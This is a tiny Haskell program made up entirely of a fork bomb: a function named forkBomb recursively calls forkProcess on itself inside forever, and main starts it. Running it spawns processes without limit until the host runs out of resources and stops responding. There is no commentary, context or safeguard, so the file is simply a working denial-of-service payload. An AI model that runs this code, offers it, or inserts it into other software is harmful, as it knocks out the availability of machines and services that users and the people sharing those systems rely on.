import Control.Monad (forever)
import System.Posix.Process (forkProcess)

forkBomb = forever $ forkProcess forkBomb

main = forkBomb
